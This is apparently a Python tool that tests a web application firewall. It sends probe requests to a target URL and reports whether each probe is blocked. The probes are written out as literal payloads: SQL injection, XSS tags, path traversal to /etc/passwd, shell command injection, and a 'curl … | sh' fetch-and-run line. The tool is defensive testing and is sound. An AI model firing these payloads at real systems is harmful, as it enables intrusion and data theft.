#!/usr/bin/env python3
"""Authorized remote verification probes for Saugra-protected deployments."""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, asdict, replace
from typing import Iterable


@dataclass(frozen=True)
class Probe:
    key: str
    name: str
    owasp: str
    vector: str
    param: str | None = None
    payload: str | None = None
    headers: tuple[tuple[str, str], ...] = ()
    path_suffix: str = ""
    method: str = "GET"
    required: bool = True
    edge_sensitive: bool = False


@dataclass
class ProbeResult:
    key: str
    name: str
    owasp: str
    vector: str
    required: bool
    edge_sensitive: bool
    status: int | None
    blocked: bool
    block_reason: str | None
    passed: bool
    error: str | None


PROBES = [
    Probe(
        key="sqli_boolean",
        name="SQL injection boolean bypass",
        owasp="A05:2025-Injection",
        vector="query",
        param="saugra_probe_sqli",
        payload="' OR 1=1--",
    ),
    Probe(
        key="sqli_union",
        name="SQL injection UNION SELECT",
        owasp="A05:2025-Injection",
        vector="query",
        param="saugra_probe_union",
        payload="UNION SELECT username,password FROM users",
    ),
    Probe(
        key="xss_script",
        name="Reflected XSS script tag",
        owasp="A05:2025-Injection",
        vector="query",
        param="saugra_probe_xss",
        payload="<script>alert(1)</script>",
    ),
    Probe(
        key="xss_event_handler",
        name="XSS event-handler payload",
        owasp="A05:2025-Injection",
        vector="query",
        param="saugra_probe_xss_attr",
        payload='"><img src=x onerror=alert(1)>',
    ),
    Probe(
        key="path_traversal",
        name="Path traversal to sensitive file",
        owasp="A01:2025-Broken Access Control",
        vector="query",
        param="saugra_probe_file",
        payload="../../../../etc/passwd",
    ),
    Probe(
        key="encoded_path_traversal",
        name="Encoded path traversal",
        owasp="A01:2025-Broken Access Control",
        vector="query",
        param="saugra_probe_encoded_file",
        payload="%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ),
    Probe(
        key="command_injection_semicolon",
        name="Command injection with shell separator",
        owasp="A05:2025-Injection",
        vector="query",
        param="saugra_probe_cmd",
        payload="cat /etc/passwd; id",
    ),
    Probe(
        key="command_injection_pipe",
        name="Command injection with pipe",
        owasp="A05:2025-Injection",
        vector="query",
        param="saugra_probe_pipe",
        payload="status | cat /etc/passwd",
    ),
    Probe(
        key="scanner_user_agent",
        name="Known scanner user-agent",
        owasp="A07:2025-Authentication Failures",
        vector="header",
        headers=(("User-Agent", "sqlmap/1.7 saugra-waf-verification"),),
        required=False,
    ),
    Probe(
        key="auth_secret_in_url",
        name="Secret-bearing URL parameter",
        owasp="A07:2025-Authentication Failures",
        vector="query",
        param="password",
        payload="saugra-waf-verification-secret",
        required=False,
    ),
    Probe(
        key="method_override_delete",
        name="Dangerous HTTP method override",
        owasp="A06:2025-Insecure Design",
        vector="header",
        headers=(("X-HTTP-Method-Override", "DELETE"),),
        required=False,
    ),
    Probe(
        key="insecure_forwarded_proto",
        name="Insecure forwarded protocol header",
        owasp="A04:2025-Cryptographic Failures",
        vector="header",
        headers=(("X-Forwarded-Proto", "http"),),
        required=False,
        edge_sensitive=True,
    ),
    Probe(
        key="suspicious_content_type",
        name="Suspicious executable content type",
        owasp="A02:2025-Security Misconfiguration",
        vector="header",
        headers=(("Content-Type", "application/x-sh"),),
        required=False,
    ),
    Probe(
        key="supply_chain_install_script",
        name="Supply-chain install script marker",
        owasp="A03:2025-Software Supply Chain Failures",
        vector="query",
        param="saugra_probe_package",
        payload="package.json postinstall curl https://example.invalid/install.sh | sh",
        required=False,
    ),
    Probe(
        key="prototype_pollution",
        name="Prototype pollution marker",
        owasp="A08:2025-Software or Data Integrity Failures",
        vector="query",
        param="__proto__",
        payload="polluted",
        required=False,
    ),
    Probe(
        key="serialized_object",
        name="Serialized object marker",
        owasp="A08:2025-Software or Data Integrity Failures",
        vector="query",
        param="saugra_probe_object",
        payload='O:8:"stdClass":0:{}',
        required=False,
    ),
    Probe(
        key="log_injection",
        name="Log injection newline marker",
        owasp="A09:2025-Security Logging and Alerting Failures",
        vector="query",
        param="saugra_probe_log",
        payload="%0aERROR status=500 request_id=saugra-waf",
        required=False,
    ),
    Probe(
        key="exceptional_null_byte",
        name="Parser edge null-byte marker",
        owasp="A10:2025-Mishandling of Exceptional Conditions",
        vector="query",
        param="saugra_probe_null",
        payload="%00",
        required=False,
    ),
    Probe(
        key="exceptional_long_key",
        name="Parser stress long parameter key",
        owasp="A10:2025-Mishandling of Exceptional Conditions",
        vector="query",
        param="saugra_" + "a" * 2050,
        payload="1",
        required=False,
    ),
]

POST_PROBES = [
    replace(probe, key=f"{probe.key}_post", vector="body", method="POST")
    for probe in PROBES
    if probe.vector == "query"
]


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Run authorized remote Saugra WAF verification probes against a staging "
            "or production URL."
        )
    )
    parser.add_argument("base_url", help="Base URL, for example https://staging.example.com")
    parser.add_argument(
        "--path",
        default="/",
        help="Harmless GET path to use for probes. Defaults to /.",
    )
    parser.add_argument(
        "--block-statuses",
        default="403,429",
        help="Comma-separated HTTP statuses treated as WAF blocks. Defaults to 403,429.",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Delay between probes in seconds. Useful when staging rate limits are strict.",
    )
    parser.add_argument(
        "--include-post",
        action="store_true",
        help="Also send form-encoded POST body probes. Best used against staging.",
    )
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds.")
    parser.add_argument(
        "--all-required",
        action="store_true",
        help="Fail if advisory OWASP/control probes are not blocked.",
    )
    parser.add_argument(
        "--require-edge-header-probes",
        action="store_true",
        help=(
            "Also fail edge-sensitive forwarded-header probes. By default these remain "
            "advisory because Nginx/Apache may normalize them before Saugra sees them."
        ),
    )
    parser.add_argument(
        "--json-output",
        help="Optional path for a JSON report.",
    )
    parser.add_argument(
        "--yes-i-am-authorized",
        action="store_true",
        help="Required confirmation that you are authorized to test the target.",
    )
    return parser.parse_args()


def normalize_target(base_url: str, path: str) -> str:
    base_url = base_url.rstrip("/")
    if not path.startswith("/"):
        path = f"/{path}"
    return f"{base_url}{path}"


def build_url(target_url: str, probe: Probe) -> str:
    if probe.method != "GET" or not probe.param:
        return target_url

    separator = "&" if "?" in target_url else "?"
    query = urllib.parse.urlencode({probe.param: probe.payload or ""})
    return f"{target_url}{separator}{query}"


def request_probe(
    target_url: str,
    probe: Probe,
    timeout: float,
    run_id: str,
    block_statuses: set[int],
) -> ProbeResult:
    headers = {
        "User-Agent": "saugra-waf-remote-verifier/1.0",
        "X-Saugra-Waf-Verification": run_id,
        "Accept": "text/html,application/json;q=0.9,*/*;q=0.1",
    }
    headers.update(dict(probe.headers))
    data = None

    if probe.method == "POST" and probe.param:
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        data = urllib.parse.urlencode({probe.param: probe.payload or ""}).encode("utf-8")

    url = build_url(f"{target_url}{probe.path_suffix}", probe)
    request = urllib.request.Request(url, data=data, headers=headers, method=probe.method)

    status: int | None = None
    error: str | None = None
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            status = response.status
    except urllib.error.HTTPError as exc:
        status = exc.code
    except (urllib.error.URLError, TimeoutError) as exc:
        error = str(exc)

    blocked = status in block_statuses if status is not None else False
    block_reason = None
    if blocked:
        block_reason = "rate_limit" if status == 429 else "waf"
    expected_block = probe.required
    passed = blocked if expected_block else True

    return ProbeResult(
        key=probe.key,
        name=probe.name,
        owasp=probe.owasp,
        vector=probe.vector,
        required=expected_block,
        edge_sensitive=probe.edge_sensitive,
        status=status,
        blocked=blocked,
        block_reason=block_reason,
        passed=passed,
        error=error,
    )


def clean_request(target_url: str, timeout: float, run_id: str) -> ProbeResult:
    probe = Probe(
        key="clean_request",
        name="Clean baseline request",
        owasp="baseline",
        vector="baseline",
        required=True,
    )
    headers = {
        "User-Agent": "saugra-waf-remote-verifier/1.0",
        "X-Saugra-Waf-Verification": run_id,
    }
    request = urllib.request.Request(target_url, headers=headers, method="GET")

    status: int | None = None
    error: str | None = None
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            status = response.status
    except urllib.error.HTTPError as exc:
        status = exc.code
    except (urllib.error.URLError, TimeoutError) as exc:
        error = str(exc)

    passed = error is None and status is not None and not (500 <= status <= 599)
    return ProbeResult(
        key=probe.key,
        name=probe.name,
        owasp=probe.owasp,
        vector=probe.vector,
        required=True,
        edge_sensitive=False,
        status=status,
        blocked=False,
        block_reason=None,
        passed=passed,
        error=error,
    )


def print_result(result: ProbeResult) -> None:
    if result.error:
        status = f"ERROR {result.error}"
    elif result.status is None:
        status = "NO_STATUS"
    elif result.block_reason:
        status = f"HTTP {result.status} {result.block_reason}"
    else:
        status = f"HTTP {result.status}"

    if result.key == "clean_request":
        outcome = "PASS" if result.passed else "FAIL"
    elif result.required:
        outcome = "PASS" if result.blocked else "FAIL"
    else:
        outcome = "PASS" if result.blocked else "WARN"

    requirement = "edge" if result.edge_sensitive and not result.required else (
        "required" if result.required else "advisory"
    )
    print(f"{outcome:4} [{requirement:8}] {result.key:32} {status:29} {result.owasp}")


def summarize(results: Iterable[ProbeResult]) -> tuple[int, int, int]:
    failures = 0
    warnings = 0
    blocked = 0
    for result in results:
        if result.blocked:
            blocked += 1
        if result.key == "clean_request" and not result.passed:
            failures += 1
        elif result.required and result.key != "clean_request" and not result.blocked:
            failures += 1
        elif not result.required and result.key != "clean_request" and not result.blocked:
            warnings += 1
    return failures, warnings, blocked


def main() -> int:
    args = parse_args()
    if not args.yes_i_am_authorized:
        print(
            "Refusing to run remote probes without --yes-i-am-authorized. "
            "Only test systems you own or are explicitly authorized to assess.",
            file=sys.stderr,
        )
        return 2

    target_url = normalize_target(args.base_url, args.path)
    block_statuses = {int(item.strip()) for item in args.block_statuses.split(",") if item.strip()}
    run_id = f"saugra-waf-remote-{time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())}"

    print("Remote Saugra WAF verification")
    print(f"target: {target_url}")
    print(f"run_id: {run_id}")
    print(f"accepted block statuses: {','.join(str(status) for status in sorted(block_statuses))}")
    if args.all_required and not args.require_edge_header_probes:
        print("edge-sensitive forwarded-header probes remain advisory")
    print()

    results: list[ProbeResult] = [clean_request(target_url, args.timeout, run_id)]
    print_result(results[0])

    probes = [*PROBES]
    if args.include_post:
        probes.extend(POST_PROBES)

    for probe in probes:
        effective_probe = probe
        if (
            args.all_required
            and not probe.required
            and (not probe.edge_sensitive or args.require_edge_header_probes)
        ):
            effective_probe = replace(probe, required=True)
        result = request_probe(target_url, effective_probe, args.timeout, run_id, block_statuses)
        results.append(result)
        print_result(result)
        if args.delay > 0:
            time.sleep(args.delay)

    failures, warnings, blocked = summarize(results)
    report = {
        "target": target_url,
        "run_id": run_id,
        "block_statuses": sorted(block_statuses),
        "summary": {
            "failures": failures,
            "warnings": warnings,
            "blocked_probes": blocked,
            "total_results": len(results),
            "post_probes_enabled": args.include_post,
            "edge_header_probes_required": args.require_edge_header_probes,
        },
        "results": [asdict(result) for result in results],
    }

    if args.json_output:
        with open(args.json_output, "w", encoding="utf-8") as handle:
            json.dump(report, handle, indent=2)
            handle.write("\n")
        print()
        print(f"wrote JSON report: {args.json_output}")

    print()
    print(
        f"summary: failures={failures}, warnings={warnings}, "
        f"blocked_probes={blocked}/{len(results) - 1}"
    )
    if any(result.block_reason == "rate_limit" for result in results):
        print(
            "note: some probes were blocked by rate limiting (HTTP 429). "
            "That is protective, but it can mask which rule would have matched. "
            "For rule-specific staging validation, temporarily raise the verifier route limit "
            "or rerun with --delay."
        )

    if failures:
        print("Remote Saugra WAF verification failed", file=sys.stderr)
        return 1

    if warnings:
        print("Remote Saugra WAF verification passed with advisory warnings")
        return 0

    print("Remote Saugra WAF verification passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
